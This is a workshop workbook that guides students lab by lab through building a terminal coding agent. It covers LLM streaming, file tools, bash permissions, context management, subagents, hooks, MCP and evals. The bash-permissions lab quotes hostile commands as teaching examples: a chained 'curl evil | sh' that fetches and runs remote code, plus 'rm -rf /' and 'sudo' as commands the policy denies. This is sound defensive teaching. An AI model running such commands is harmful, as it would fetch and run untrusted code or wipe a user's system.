# Student workbook · Forja: build your own coding agent

> A 2-day workshop. By the end you'll have **your own terminal coding agent** —like the commercial ones— running on open models on your machine, and you'll understand every piece because you wrote it.


## How to use this workbook
- Each lab: **goal → concepts → what you implement → run → checkpoint → challenges**.
- The code to complete is in `forja/` (look for `TODO NN.x`). Each lab's tests are in `tests/test_lNN_*.py`: `python scripts/tasks.py test NN`.
- When a lab's tests pass, the capability lights up in your CLI (`forja`). Pending labs appear as notes.
- Fallen behind? `python scripts/tasks.py catchup NN` copies the solutions of earlier labs (backing up yours).
- Practice project: `playground/` (a mini invoicing library with deliberate bugs). To reset it: `python scripts/tasks.py reset`.

## Map
| Day | Lab | Topic | What your agent gains |
|---|---|---|---|
| 1 | 00 | Setup and first contact | — |
| 1 | 01 | Streaming LLM client | streaming chat |
| 1 | 02 | File tools | read, search and edit |
| 1 | 03 | The agent loop | act in a loop |
| 1 | 04 | Bash and permissions | run commands with permissions |
| 1 | 05 | The CLI: your terminal agent | full interface |
| 2 | 06 | Context engineering | knows your project |
| 2 | 07 | Context management and compaction | long sessions |
| 2 | 08 | Plan before acting | plans |
| 2 | 09 | Subagents | delegates |
| 2 | 10 | Extensibility: hooks, skills and MCP | hooks, skills, MCP |
| 2 | 11 | Sessions and undo | resume and undo |
| 2 | 12 | Evals: measure your agent | is measured |

---

## Lab 00 · Setup and first contact

*Day 1 · 09:00–09:30*

**Goal:** Have Ollama running a tool-capable model, the repo installed and the tests running.

### Concepts
- **What we will build:** *Forja*, a terminal coding agent like the commercial ones: it reads and edits your project, runs commands, asks for permission, plans, delegates to subagents and is extended with hooks, skills and MCP. It runs on open models on your machine.
- **Agent = model + tools + loop. Harness = everything else** (permissions, context, UI, sessions…). The model is a swappable part: the harness is what we build.
- **How the labs work:** each lab has `TODO` functions in `forja/` and tests in `tests/`. When the tests pass, the capability lights up in your CLI. Falling behind? `python scripts/tasks.py catchup NN`.
- **Models:** `qwen3:8b` (16 GB laptop), `qwen3-coder:30b` (32 GB Mac or 24 GB GPU), or the room's shared server. OpenRouter with open-weight models only.

### What you implement
This lab has no TODOs.

### Run
```bash
python -m venv .venv
.venv\Scripts\activate            # Windows   (Linux/macOS: source .venv/bin/activate)
python scripts/tasks.py setup      # installs and creates .env
ollama pull qwen3:8b               # or the model for your hardware tier
python scripts/tasks.py test       # almost everything red: that's expected
cd playground && python -m pytest -q   # 3 tests fail: work for your agent
```

### Checkpoint
`ollama run qwen3:8b "hello"` answers and `python scripts/tasks.py test` runs (red, as it should). The tutor shows `python scripts/tasks.py demo`: that is what your agent will look like at the end of day 2.

### Challenges
1. Run `ollama ps` while the model answers: GPU or CPU? How much memory?
2. Skim `forja/harness.py`: find the “gate” every tool call goes through.


---

## Lab 01 · Streaming LLM client

*Day 1 · 09:30–10:15*

**Goal:** Talk to any OpenAI-compatible backend in streaming mode and rebuild tool calls that arrive in pieces.

### Concepts
- **One protocol, many backends:** Ollama, vLLM, LM Studio, llama.cpp and OpenRouter all speak Chat Completions. The `openai` SDK is just an HTTP client; the model is open.
- **Streaming:** text arrives token by token (the CLI feels alive). **Tool calls arrive in pieces too**: `index`, then `id` and `name`, then the argument JSON in fragments, sometimes interleaved across calls.
- **Local-model quirks:** `<think>…</think>` blocks that may be split across chunks; tool calls written as text `<tool_call>{…}</tool_call>`.
- **Retries:** only transient errors (connection, 429, 5xx) with exponential backoff. A 400 isn't fixed by retrying.

### What you implement
| TODO | File | What |
|---|---|---|
| 01.1 | `forja/llm.py` | ToolCallAccumulator: concatenate fragments by index |
| 01.2 | `forja/llm.py` | ThinkFilter: strip <think> even when the tag is split |
| 01.3 | `forja/llm.py` | LLMClient.stream: retries, TextDelta and Done events |

### Run
```bash
python scripts/tasks.py test 01
forja doctor                      # does the model call tools?
forja                             # already a streaming chat (no tools yet)
```

### Checkpoint
`forja doctor` shows ✔ and `forja` answers in streaming. “lab NN pending” notes are expected.

### Challenges
1. Measure local time-to-first-token against OpenRouter.
2. What if the model emits two tool calls with the same `index`? Can it happen?

**Tests:** `tests/test_l01_llm.py` · **Fallen behind?** `python scripts/tasks.py catchup 02`


---

## Lab 02 · File tools

*Day 1 · 10:15–11:15*

**Goal:** Give the agent eyes and hands on the project: read, search, create and edit files safely.

### Concepts
- **The schema is the prompt:** name, docstring and type hints generate the JSON Schema the model reads. A good description beats any system-prompt instruction.
- **Tools never raise:** every error goes back to the model as actionable text (“appears 3 times: add context”) so it can self-correct.
- **edit_file = exact replacement of a unique string.** The most robust format for small models (they produce bad diffs). Typical model mistakes: including `read_file` line numbers or changing indentation.
- **Read before edit** and detect external changes (mtime): the agent doesn't overwrite what it hasn't seen or what you just changed.
- **Sandbox:** every path resolves inside the workspace. `../` and outside absolute paths are rejected.
- **Explore without loading the repo:** `grep` and `glob` return paths and lines; the agent reads only what's relevant.

### What you implement
| TODO | File | What |
|---|---|---|
| 02.1 | `forja/tools.py` | Tool.schema: OpenAI-format JSON Schema |
| 02.2 | `forja/tools.py` | ToolRegistry.execute: run without ever raising |
| 02.3 | `forja/fs_tools.py` | Workspace.resolve: path sandbox |
| 02.4 | `forja/fs_tools.py` | write_file: create / overwrite with read-first |
| 02.5 | `forja/fs_tools.py` | edit_file: exact, unique replacement with useful errors |
| 02.6 | `forja/fs_tools.py` | grep: regex search across the workspace |

### Run
```bash
python scripts/tasks.py test 02
forja --cwd playground
> what does the due_date function do?        (no loop yet: you'll see the first tool call)
```

### Checkpoint
Lab 02 tests green. With lab 03 still pending, Forja is still a chat: the loop comes next.

### Challenges
1. Add a `list_dir` tool with a 2-level tree. Does it help or hurt the model's exploration?
2. Ask the model to edit something and watch its `old_string` mistakes: which hint would you add to the error message?

**Tests:** `tests/test_l02_tools.py` · **Fallen behind?** `python scripts/tasks.py catchup 03`


---

## Lab 03 · The agent loop

*Day 1 · 11:30–12:15*

**Goal:** Write the loop that turns a model into an agent: think → act → observe, until done.

### Concepts
- **Ten lines:** ask for a response with tools → if no tools requested, done → execute → append results → repeat. Every agent framework is this with more layers.
- **History is the state:** each `assistant` with `tool_calls` is followed by one `tool` message per `tool_call_id`. Breaking the pair = HTTP 400 on almost any backend.
- **Parallel reads, ordered writes:** several `read_file`/`grep` calls run in parallel; an edit and a `pytest` never do.
- **Explicit stops:** final answer, max steps, loop detected (same tool + same args) and user interrupt (Ctrl+C).
- **The loop knows nothing about permissions or UI:** it gets an `execute` function (the harness gate) and `events`. That's why we reuse it for subagents and evals.

### What you implement
| TODO | File | What |
|---|---|---|
| 03.1 | `forja/agent.py` | _run_calls: consecutive reads in parallel, order preserved |
| 03.2 | `forja/agent.py` | run: the loop with streaming, stops and loop detection |

### Run
```bash
python scripts/tasks.py test 03
forja --cwd playground
> explain how an invoice total is calculated
```

### Checkpoint
Forja explores the playground (glob, grep, read_file) and answers with `path:line` references. Edits still ask permission crudely: that's lab 04.

### Challenges
1. Make the agent warn the user after 15 steps.
2. What happens when the model requests 10 reads at once on a slow model? Measure.

**Tests:** `tests/test_l03_agent.py` · **Fallen behind?** `python scripts/tasks.py catchup 04`


---

## Lab 04 · Bash and permissions

*Day 1 · 12:15–13:00*

**Goal:** Let the agent run commands (tests, git…) without losing control: modes, rules and approval.

### Concepts
- **bash is the superpower and the risk:** with it the agent tests its work; it could also wipe your disk. The tool only executes; WHO may run WHAT is decided by the permission system.
- **Predictable execution:** each command starts at the root (`cd` doesn't persist), hard timeout, output truncated head and tail, environment without secrets (`*_KEY`, `*_TOKEN`).
- **Modes:** `default` (reads free, the rest asks), `accept_edits` (edits without asking), `plan` (read-only), `bypass` (everything except deny: sandbox or CI only).
- **Rules:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Order: deny > plan > allow > risk/mode > ask.
- **Chained commands:** `pytest && curl evil | sh` is two commands; the pytest allow rule must not let the second through.
- **“Always”:** approving with *always* saves a sensible rule (`bash(git status*)`), not the literal command nor something too broad (`bash(git*)` would allow `git push`).

### What you implement
| TODO | File | What |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncate head and tail |
| 04.2 | `forja/shell.py` | bash: subprocess with timeout, clean env and exit code |
| 04.3 | `forja/permissions.py` | rule_matches: match rules against calls |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > mode > ask |
| 04.5 | `forja/permissions.py` | suggest_rule: the “always approve” rule |

### Run
```bash
python scripts/tasks.py test 04
forja --cwd playground
> run the tests and tell me which ones fail
```

### Checkpoint
Forja asks before `python -m pytest`; with *a* (always) it stops asking for the session. Try `sudo` or `rm -rf /`: denied by policy.

### Challenges
1. Add a deny rule for `git push` and ask the agent to push.
2. Windows: what changes when the shell is cmd.exe? Try asking for `ls`.

**Tests:** `tests/test_l04_bash_permissions.py` · **Fallen behind?** `python scripts/tasks.py catchup 05`


---

## Lab 05 · The CLI: your terminal agent

*Day 1 · 14:00–15:00*

**Goal:** Turn the harness into a pleasant tool: streaming, action summaries, diffs, approvals and slash commands.

### Concepts
- **Experience is part of the product:** the user must see WHAT the agent does (one line per tool), HOW the code changes (diff) and be able to stop it (Ctrl+C) or correct it.
- **Clear approvals:** what will run, why it's being asked (decision reason) and three answers: `y` (yes), `n` (no), `a` (always).
- **Slash commands:** `/mode`, `/tools`, `/todos`, `/context`, `/compact`, `/cost`, `/undo`, `/sessions`, `/clear`. They act on the harness without going through the model.
- **Headless:** `forja -p "…"` runs and exits: scripts, CI and evals (lab 12). With no user, anything needing approval is denied.

### What you implement
| TODO | File | What |
|---|---|---|
| 05.1 | `forja/cli.py` | summarize_call: one readable line per tool call |
| 05.2 | `forja/cli.py` | diff_styles: colour the diff |
| 05.3 | `forja/cli.py` | ask_approval: y / n / a (yes / no / always) |
| 05.4 | `forja/cli.py` | handle_slash: slash commands |

### Run
```bash
python scripts/tasks.py test 05
forja --cwd playground --mode accept_edits
> fix the amount rounding bug and check with the tests
/tools
/cost
```

### Checkpoint
**Day 1 milestone** (15:15): Forja fixes the 3 failing tests in `playground/` with your local model. Compare with a neighbour using another model.

### Challenges
1. Add `/model <name>` to switch models on the fly.
2. Show the % of context used in the REPL prompt.

**Tests:** `tests/test_l05_cli.py` · **Fallen behind?** `python scripts/tasks.py catchup 06`


---

## Lab 06 · Context engineering

*Day 2 · 09:00–09:40*

**Goal:** Decide what the model sees each turn: layered prompt, AGENTS.md, environment and @file mentions.

### Concepts
- **The system prompt is rebuilt every turn** in layers: agent base, mode reminder, project instructions, skills, todo list and environment (git, OS, date, model).
- **AGENTS.md:** an open convention for project instructions read by several tools. User global + from the highest folder down to the current one: most specific last.
- **Environment = cheap truth:** git branch and changes, directory, date. Stops the model guessing.
- **@mentions:** `@src/app.py` puts the file in the message (and marks it read). Saves a loop iteration.
- **Less is more with local models:** every prompt token competes with code. Short, concrete instructions.

### What you implement
| TODO | File | What |
|---|---|---|
| 06.1 | `forja/context.py` | find_instruction_files: user and hierarchy AGENTS.md |
| 06.2 | `forja/context.py` | build_system_prompt: layers in order |
| 06.3 | `forja/context.py` | expand_mentions: @path → content |

### Run
```bash
python scripts/tasks.py test 06
forja --cwd playground
> review @invoices/amounts.py and tell me whether it follows AGENTS.md
```

### Checkpoint
The agent quotes `playground/AGENTS.md` rules (half-up, don't touch tests) without being told.

### Challenges
1. Write your `~/.forja/AGENTS.md` with your preferences (language, style).
2. Add the Python version and last 3 commits to the environment.

**Tests:** `tests/test_l06_context.py` · **Fallen behind?** `python scripts/tasks.py catchup 07`


---

## Lab 07 · Context management and compaction

*Day 2 · 09:40–10:25*

**Goal:** Make a long session fit a local model's window without breaking history.

### Concepts
- **The budget:** local models work with 16–32k effective tokens. A verbose `pytest` or a large file eats the window.
- **Level 1 — microcompaction (free):** blank old tool outputs. The model already used them; it can re-read if needed.
- **Level 2 — compaction (1 call):** summarise old turns (goal, files, commands, decisions, pending) and keep recent ones.
- **Invariant:** cut only before a `user` message. Never between `tool_calls` and their `tool` results.
- **It's lossy:** measure it with evals (lab 12) using a small window.

### What you implement
| TODO | File | What |
|---|---|---|
| 07.1 | `forja/compaction.py` | microcompact: blank old outputs |
| 07.2 | `forja/compaction.py` | compact: summary + recent turns, pairs intact |

### Run
```bash
python scripts/tasks.py test 07
forja --cwd playground
> read every file in the project and summarise them
/context
/compact
/context
```

### Checkpoint
`/context` drops after `/compact` and the agent still knows what it was doing.

### Challenges
1. Set `"contextWindow": 6000` in `.forja/settings.json` and work: when does it compact?
2. Compact with a smaller model than the main one.

**Tests:** `tests/test_l07_compaction.py` · **Fallen behind?** `python scripts/tasks.py catchup 08`


---

## Lab 08 · Plan before acting

*Day 2 · 10:25–11:10*

**Goal:** Visible task list and plan mode: the agent investigates, proposes and only executes once you approve.

### Concepts
- **todo_write:** the agent keeps its own list (pending / in_progress / completed). It forces decomposition and greatly improves small models' persistence on long tasks. One task in progress.
- **The list goes back into context** every turn (a system-prompt layer): the agent doesn't get lost.
- **Plan mode:** read-only via permissions, not via the model's goodwill. When it has a plan, it calls `exit_plan_mode`; if you approve, the harness switches to default mode.
- **When to use it:** multi-file changes, unfamiliar code, anything hard to undo.

### What you implement
| TODO | File | What |
|---|---|---|
| 08.1 | `forja/planning.py` | todo_write with validation |
| 08.2 | `forja/planning.py` | exit_plan_mode with user approval |

### Run
```bash
python scripts/tasks.py test 08
forja --cwd playground --mode plan
> add percentage discounts to invoices (before VAT) with tests
/todos
```

### Checkpoint
In plan mode the agent investigates, presents a plan and, once approved, executes it ticking off tasks.

### Challenges
1. On approval switch to `accept_edits` instead of `default`. When is that a good idea?
2. Show the task list live under each answer.

**Tests:** `tests/test_l08_planning.py` · **Fallen behind?** `python scripts/tasks.py catchup 09`


---

## Lab 09 · Subagents

*Day 2 · 11:25–12:10*

**Goal:** Delegate exploration and reviews to agents with their own context and restricted tools.

### Concepts
- **The problem:** exploring a repo costs 20 reads and 30k tokens that stay in the main agent's context forever.
- **The solution:** the `task` tool launches a subagent with a CLEAN context (system + prompt) that returns only its conclusion. The main agent pays ~300 tokens.
- **Same loop, other tools:** we reuse lab 03's `Agent` with a subset of tools and the SAME permission gate. A subagent can't spawn subagents.
- **Profiles in Markdown:** `.forja/agents/reviewer.md` with frontmatter (name, description, tools). The description is what the model reads to decide when to delegate.
- **The subagent prompt must be self-contained:** it doesn't see the conversation.

### What you implement
| TODO | File | What |
|---|---|---|
| 09.1 | `forja/subagents.py` | load_profiles: profiles from Markdown |
| 09.2 | `forja/subagents.py` | task: launch a subagent with a clean context |

### Run
```bash
python scripts/tasks.py test 09
cp -r examples/project/.forja playground/      # Windows: xcopy /E /I examples\project\.forja playground\.forja
forja --cwd playground
> use a subagent to find every place where amounts are rounded
> ask the reviewer subagent to review my uncommitted changes
```

### Checkpoint
You see the subagent's tool calls prefixed `[explore]` and the main context barely grows (`/context`).

### Challenges
1. Create a `tester` subagent that can only run `python -m pytest*`.
2. Run the subagent on a smaller, faster model.

**Tests:** `tests/test_l09_subagents.py` · **Fallen behind?** `python scripts/tasks.py catchup 10`


---

## Lab 10 · Extensibility: hooks, skills and MCP

*Day 2 · 12:10–13:20*

**Goal:** Let the team extend the agent without touching its code: deterministic policy, on-demand knowledge and external tools.

### Concepts
- **Hooks = guarantees:** AGENTS.md *asks*, a hook *enforces*. Shell commands in `settings.json` that receive the event as JSON on stdin. Exit 2 blocks; exit 0 continues. It's the convention commercial agents use: what you learn here applies there.
- **Events:** `PreToolUse` (block), `PostToolUse` (feedback, e.g. a linter), `UserPromptSubmit` (filter or add context), `Stop` (don't finish until tests pass).
- **Skills = progressive disclosure:** only the catalogue (name + description) goes in the prompt; the body is loaded with the `skill` tool when needed. Portable `SKILL.md` format.
- **MCP:** servers that expose tools (issues, DB, wiki, CI). Forja starts them from `settings.json` and registers them as `mcp__server__tool`, with `exec` risk: they go through permissions.

### What you implement
| TODO | File | What |
|---|---|---|
| 10.1 | `forja/hooks.py` | matching: hooks by event and matcher |
| 10.2 | `forja/hooks.py` | run: execute and map exit codes |
| 10.3 | `forja/skills.py` | discover_skills: SKILL.md catalogue |
| 10.4 | `forja/skills.py` | skill: load the body on demand |
| 10.5 | `forja/mcp_tools.py` | mcp_tool_name: mcp__server__tool namespace |

### Run
```bash
python scripts/tasks.py test 10
cp -r examples/project/.forja playground/      # if you didn't in lab 09
forja --cwd playground
> list the open issues, fix #12 and comment on the issue what you changed
> commit following the repo's convention
```

### Checkpoint
The Stop hook won't let it finish with red tests; the agent loads the `conventional-commits` skill before committing; `mcp__issues__*` tools show up in `/tools`.

### Challenges
1. A PostToolUse hook that runs `ruff` on the edited file.
2. Connect a real MCP server from your team.

**Tests:** `tests/test_l10_extensions.py` · **Fallen behind?** `python scripts/tasks.py catchup 11`


---

## Lab 11 · Sessions and undo

*Day 2 · 14:20–14:55*

**Goal:** Resume sessions and undo what the agent did without relying on git.

### Concepts
- **Append-only JSONL transcript:** one message per line in `.forja/sessions/`. Resume, audit and debug. After compaction, a marker with the new state.
- **Checkpoints:** before a tool modifies a file, its original content (or that it didn't exist) is saved — only the first time per turn.
- **/undo:** restores the files from the last turn with changes. Works without git and doesn't touch your commits.
- **Limit:** `bash` side effects (installing packages, `rm`) can't be undone. That's why bash goes through permissions.

### What you implement
| TODO | File | What |
|---|---|---|
| 11.1 | `forja/session.py` | Transcript.append |
| 11.2 | `forja/session.py` | Transcript.load (with compaction markers) |
| 11.3 | `forja/session.py` | Checkpoints.before_write |
| 11.4 | `forja/session.py` | Checkpoints.undo |

### Run
```bash
python scripts/tasks.py test 11
forja --cwd playground --mode accept_edits
> change the default due-date period to 60 days
/undo
/sessions
forja --cwd playground --resume <id>
```

### Checkpoint
`/undo` restores the file and `--resume` continues the previous conversation.

### Challenges
1. `/undo N` to undo several turns.
2. `/rewind`: undo files AND roll history back to the same point.

**Tests:** `tests/test_l11_sessions.py` · **Fallen behind?** `python scripts/tasks.py catchup 12`


---

## Lab 12 · Evals: measure your agent

*Day 2 · 14:55–16:00*

**Goal:** Compare models and harness changes with real tasks and objective checks.

### Concepts
- **Without measuring, it's all opinion.** Is `qwen3-coder:30b` better than `qwen3:8b`? Does your new prompt help? Measure it.
- **Task = prompt + objective check** on a CLEAN COPY of the project: tests (`command`), HIDDEN tests copied afterwards (`hidden`, so it can't cheat), answer content (`answer_contains`) and changing nothing (`forbid_changes`).
- **Headless + bypass inside the copy:** the sandbox is the temp folder.
- **Several repetitions:** models aren't deterministic. Look at pass rate, steps, time and tokens.

### What you implement
| TODO | File | What |
|---|---|---|
| 12.1 | `forja/evals.py` | grade: apply the checks |
| 12.2 | `forja/evals.py` | summarize: pass rate, per task, steps, time, tokens |

### Run
```bash
python scripts/tasks.py test 12
python scripts/tasks.py evals --only fix_rounding
python scripts/tasks.py evals --repeat 3
python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3
```

### Checkpoint
You have a report in `out/` and can say, with numbers, which model you'd use for which tasks.

### Challenges
1. Add your own task to `evals/tasks.yaml`.
2. Compare your harness with and without `todo_write` in the base prompt.

**Tests:** `tests/test_l12_evals.py` · **Fallen behind?** `python scripts/tasks.py catchup end`


---

## Final project (day 2, 16:00–17:00): your Forja

Customise your agent for the way you work and prove it with numbers:

1. `~/.forja/AGENTS.md` with your preferences and an `AGENTS.md` for a real repo of yours.
2. A **skill** from your team (conventions, deployment, review…).
3. A **hook** that guarantees something you currently ask for politely (tests, linter, secrets).
4. A specialised **subagent**.
5. An **eval task** representing your daily work, and the report comparing two models.

3-minute demo per person or pair: what you added and what changed in the evals.

---

## Glossary
- **Agent** — Model + tools + loop that decides and acts until a task is done.
- **Harness** — Everything around the loop: permissions, context, UI, hooks, sessions.
- **Tool call** — Structured request (name + JSON arguments) the model makes to the harness. The model executes nothing.
- **Streaming** — Receiving the response in pieces as it's generated.
- **Context window** — Maximum tokens the model sees at once.
- **Compaction** — Shrinking history (blanking old outputs, summarising) so it fits.
- **Plan mode** — Read-only mode where the agent proposes a plan before acting.
- **Subagent** — Agent launched by another with a clean context and restricted tools.
- **Hook** — Command the harness runs at a fixed point; can block (exit 2).
- **Skill** — Instructions loaded on demand; only the description goes in the prompt.
- **MCP** — Standard protocol to connect external tools to an agent.
- **Eval** — Task with an objective check to measure an agent or a model.
